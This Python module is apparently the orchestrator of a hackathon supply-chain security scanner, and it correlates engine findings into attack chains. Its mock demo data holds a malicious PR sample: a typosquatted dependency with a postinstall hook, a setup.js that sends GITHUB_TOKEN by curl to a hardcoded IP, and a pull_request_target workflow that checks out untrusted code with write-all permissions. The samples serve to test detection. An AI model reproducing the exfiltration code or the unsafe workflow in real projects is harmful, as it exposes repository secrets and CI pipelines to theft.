"""
CodeFort Scan Orchestrator — Coordinates the analysis pipeline.

Pipeline (TRD §4):
  Input → Normalization → Parallel Static Engines → Evidence Graph
  → Attack-Chain Correlation → BARQAI → Policy → GitHub + Web + Extension

Handles partial failures gracefully (ARCHITECTURE.md §11).
Uses dedup key for idempotency (TRD §6).
"""

from __future__ import annotations

import logging
import uuid
from datetime import datetime
from typing import Any

from codefort_schemas.models import (
    AnalysisProfile,
    AttackChain,
    AttackChainNode,
    EngineResult,
    EngineStatus,
    Finding,
    PolicyDecision,
    ScanRequest,
    ScanResult,
    ScanStatus,
    Severity,
)

from app.engines.code_engine import CodeEngine, FileChange as CodeFileChange
from app.engines.dependency_engine import DependencyEngine, FileChange as DepFileChange
from app.engines.workflow_engine import WorkflowEngine, FileChange as WFFileChange
from app.services.barqai_service import BARQAIService
from app.services.policy_engine import PolicyEngine
from app.services.github_service import GitHubService

logger = logging.getLogger("codefort.orchestrator")

# In-memory scan store (hackathon). Production: PostgreSQL via database.py
_scan_store: dict[str, ScanResult] = {}
_dedup_store: set[str] = set()


def get_scan(scan_id: str) -> ScanResult | None:
    """Retrieve a scan result by ID."""
    return _scan_store.get(scan_id)


def list_scans(limit: int = 50, offset: int = 0) -> list[ScanResult]:
    """List scan results with pagination."""
    all_scans = sorted(
        _scan_store.values(),
        key=lambda s: s.created_at,
        reverse=True,
    )
    return all_scans[offset : offset + limit]


async def run_scan(request: ScanRequest) -> ScanResult:
    """
    Execute the full analysis pipeline for a PR.

    Steps:
    1. Deduplication check
    2. Fetch changed files (mock for hackathon)
    3. Run engines in parallel
    4. Aggregate evidence
    5. Correlate attack chains
    6. Generate BARQAI explanation
    7. Evaluate policy
    8. Post to GitHub
    9. Store and return result

    Args:
        request: Scan request with repo, PR, and commit details.

    Returns:
        Complete ScanResult with findings, chains, BARQAI, and policy.
    """
    # Step 1: Idempotency check (TRD §6)
    dedup_key = request.dedup_key
    if dedup_key in _dedup_store:
        logger.info("Duplicate scan detected: %s", dedup_key)
        # Find existing scan for this key
        for scan in _scan_store.values():
            if scan.head_sha == request.head_sha and scan.pr_number == request.pr_number:
                return scan

    _dedup_store.add(dedup_key)

    scan_id = str(uuid.uuid4())
    logger.info(
        "Starting scan %s for %s PR #%d (sha: %s)",
        scan_id,
        request.repository_full_name,
        request.pr_number,
        request.head_sha[:7],
    )

    result = ScanResult(
        scan_id=scan_id,
        scan_status=ScanStatus.RUNNING,
        repository_full_name=request.repository_full_name,
        pr_number=request.pr_number,
        head_sha=request.head_sha,
        base_sha=request.base_sha,
        profile=request.profile,
    )

    # Store immediately so dashboard can show "running" status
    _scan_store[scan_id] = result

    try:
        # Step 2: Fetch changed files
        # In production, this would fetch from GitHub API using installation token
        # For hackathon, we use mock data or accept files via API
        files = _get_mock_files_for_demo()

        # Step 3: Run analysis engines
        engine_results: list[EngineResult] = []

        # Code Engine
        code_result = await _run_engine_safe(
            "code_engine",
            CodeEngine().analyze,
            [CodeFileChange(path=f["path"], content=f["content"]) for f in files],
        )
        engine_results.append(code_result)

        # Dependency Engine
        dep_files = [f for f in files if _is_manifest_file(f["path"])]
        dep_result = await _run_engine_safe(
            "dependency_engine",
            DependencyEngine().analyze,
            [DepFileChange(path=f["path"], content=f["content"]) for f in dep_files],
        )
        engine_results.append(dep_result)

        # Workflow Engine
        wf_files = [f for f in files if ".github/workflows/" in f["path"]]
        wf_result = await _run_engine_safe(
            "workflow_engine",
            WorkflowEngine().analyze,
            [WFFileChange(path=f["path"], content=f["content"]) for f in wf_files],
        )
        engine_results.append(wf_result)

        result.engine_results = engine_results

        # Step 4: Aggregate all findings
        all_findings: list[Finding] = []
        for er in engine_results:
            all_findings.extend(er.findings)

        result.findings_count = len(all_findings)

        # Build severity summary
        severity_counts: dict[str, int] = {}
        for f in all_findings:
            sev = f.severity.value
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        result.severity_summary = severity_counts

        # Step 5: Attack-chain correlation
        result.attack_chains = _correlate_attack_chains(all_findings)

        # Step 6: BARQAI explanation
        barqai_service = BARQAIService()
        result.barqai_explanation = await barqai_service.explain(all_findings)

        # Step 7: Policy evaluation
        policy_engine = PolicyEngine()
        result.policy_result = policy_engine.evaluate(all_findings)

        # Step 8: Post to GitHub
        github_service = GitHubService()
        await github_service.post_check_run(
            result,
            installation_id=request.installation_id,
        )

        # Determine final status
        has_failed_engine = any(
            er.status == EngineStatus.FAILED for er in engine_results
        )
        result.scan_status = ScanStatus.PARTIAL if has_failed_engine else ScanStatus.COMPLETED
        result.completed_at = datetime.utcnow()

        logger.info(
            "Scan %s completed: %d findings, decision=%s",
            scan_id,
            result.findings_count,
            result.policy_result.decision.value if result.policy_result else "none",
        )

    except Exception as e:
        logger.error("Scan %s failed: %s", scan_id, e, exc_info=True)
        result.scan_status = ScanStatus.FAILED
        result.completed_at = datetime.utcnow()

    # Update store
    _scan_store[scan_id] = result
    return result


async def _run_engine_safe(
    engine_name: str,
    analyze_fn: Any,
    files: list,
) -> EngineResult:
    """
    Run an engine with failure isolation (ARCHITECTURE.md §11).

    If the engine fails, return a FAILED result instead of crashing the whole scan.
    """
    try:
        return await analyze_fn(files)
    except Exception as e:
        logger.error("Engine %s failed: %s", engine_name, e, exc_info=True)
        return EngineResult(
            engine_name=engine_name,
            status=EngineStatus.FAILED,
            error_message=str(e),
        )


def _correlate_attack_chains(findings: list[Finding]) -> list[AttackChain]:
    """
    Correlate findings into attack chains (TRD §TR-007).

    Looks for patterns like:
      new dependency → install hook → process execution → credential access → network
    """
    chains: list[AttackChain] = []

    # Group findings by category prefix
    categories: dict[str, list[Finding]] = {}
    for f in findings:
        category = f.rule_id.split(".")[0]
        categories.setdefault(category, []).append(f)

    # Check for the classic supply-chain attack pattern
    has_dep = "dependency" in categories
    has_hook = any(
        f.rule_id.startswith("dependency.install_hook") for f in findings
    )
    has_process = any(
        f.rule_id.startswith("code.subprocess") for f in findings
    )
    has_credential = any(
        f.rule_id.startswith("code.env_secret") for f in findings
    )
    has_network = any(
        f.rule_id.startswith("code.network_import") or f.rule_id.startswith("code.hardcoded_ip")
        for f in findings
    )

    if has_dep and (has_hook or has_process) and (has_credential or has_network):
        nodes: list[AttackChainNode] = []
        step = 1

        if has_dep:
            dep_finding = categories["dependency"][0]
            nodes.append(AttackChainNode(
                step=step,
                category="dependency",
                description="New dependency added to the project",
                finding_id=dep_finding.finding_id,
                evidence_ids=[e.evidence_id for e in dep_finding.evidence],
            ))
            step += 1

        if has_hook:
            hook_findings = [f for f in findings if "install_hook" in f.rule_id]
            if hook_findings:
                nodes.append(AttackChainNode(
                    step=step,
                    category="install_hook",
                    description="Install-time script executes during package installation",
                    finding_id=hook_findings[0].finding_id,
                    evidence_ids=[e.evidence_id for e in hook_findings[0].evidence],
                ))
                step += 1

        if has_process:
            proc_findings = [f for f in findings if "subprocess" in f.rule_id]
            if proc_findings:
                nodes.append(AttackChainNode(
                    step=step,
                    category="process",
                    description="Subprocess or system command execution",
                    finding_id=proc_findings[0].finding_id,
                    evidence_ids=[e.evidence_id for e in proc_findings[0].evidence],
                ))
                step += 1

        if has_credential:
            cred_findings = [f for f in findings if "env_secret" in f.rule_id]
            if cred_findings:
                nodes.append(AttackChainNode(
                    step=step,
                    category="credential_access",
                    description="Environment variable or credential access detected",
                    finding_id=cred_findings[0].finding_id,
                    evidence_ids=[e.evidence_id for e in cred_findings[0].evidence],
                ))
                step += 1

        if has_network:
            net_findings = [f for f in findings if "network" in f.rule_id or "hardcoded_ip" in f.rule_id]
            if net_findings:
                nodes.append(AttackChainNode(
                    step=step,
                    category="network",
                    description="Outbound network communication to external server",
                    finding_id=net_findings[0].finding_id,
                    evidence_ids=[e.evidence_id for e in net_findings[0].evidence],
                ))

        if len(nodes) >= 3:
            chains.append(AttackChain(
                chain_id=str(uuid.uuid4()),
                severity=Severity.CRITICAL,
                title="Potential supply-chain attack: dependency → execution → exfiltration",
                nodes=nodes,
            ))

    # Check for CI/CD attack pattern
    has_prt = any("pull_request_target" in f.rule_id for f in findings)
    has_untrusted = any("untrusted_checkout" in f.rule_id for f in findings)

    if has_prt and has_untrusted:
        wf_nodes = []
        step = 1

        prt_findings = [f for f in findings if "pull_request_target" in f.rule_id]
        if prt_findings:
            wf_nodes.append(AttackChainNode(
                step=step,
                category="workflow",
                description="Workflow uses pull_request_target trigger with elevated permissions",
                finding_id=prt_findings[0].finding_id,
                evidence_ids=[e.evidence_id for e in prt_findings[0].evidence],
            ))
            step += 1

        uc_findings = [f for f in findings if "untrusted_checkout" in f.rule_id]
        if uc_findings:
            wf_nodes.append(AttackChainNode(
                step=step,
                category="untrusted_code",
                description="Untrusted PR code checked out with repository secrets access",
                finding_id=uc_findings[0].finding_id,
                evidence_ids=[e.evidence_id for e in uc_findings[0].evidence],
            ))
            step += 1

        wf_nodes.append(AttackChainNode(
            step=step,
            category="credential_theft",
            description="Potential credential exfiltration via elevated workflow context",
        ))

        chains.append(AttackChain(
            chain_id=str(uuid.uuid4()),
            severity=Severity.CRITICAL,
            title="CI/CD attack: pwn request via pull_request_target",
            nodes=wf_nodes,
        ))

    return chains


def _is_manifest_file(path: str) -> bool:
    """Check if a file is a dependency manifest."""
    filename = path.split("/")[-1].lower()
    return filename in {
        "package.json", "requirements.txt", "pyproject.toml",
        "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
        "Pipfile", "Pipfile.lock", "setup.py", "setup.cfg",
    }


def _get_mock_files_for_demo() -> list[dict[str, str]]:
    """
    Mock files for demo/hackathon.

    Simulates a malicious PR that:
    1. Adds a typosquatted dependency
    2. Has a postinstall hook
    3. Contains code that reads env vars and makes network calls
    4. Includes a suspicious workflow
    """
    return [
        {
            "path": "package.json",
            "content": """{
  "name": "my-project",
  "dependencies": {
    "lodash": "^4.17.21",
    "reqeusts": "^1.0.0"
  },
  "scripts": {
    "postinstall": "node setup.js"
  }
}""",
        },
        {
            "path": "setup.js",
            "content": """
import subprocess
import os
import base64

secret = os.environ.get('GITHUB_TOKEN')
encoded = base64.b64encode(secret.encode())
subprocess.Popen(['curl', '-X', 'POST', 'http://45.33.32.156/collect', '-d', encoded])
""",
        },
        {
            "path": ".github/workflows/auto-review.yml",
            "content": """
name: Auto Review
on:
  pull_request_target:
    types: [opened, synchronize]

permissions: write-all

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
      - run: echo "${{ github.event.pull_request.title }}"
""",
        },
    ]
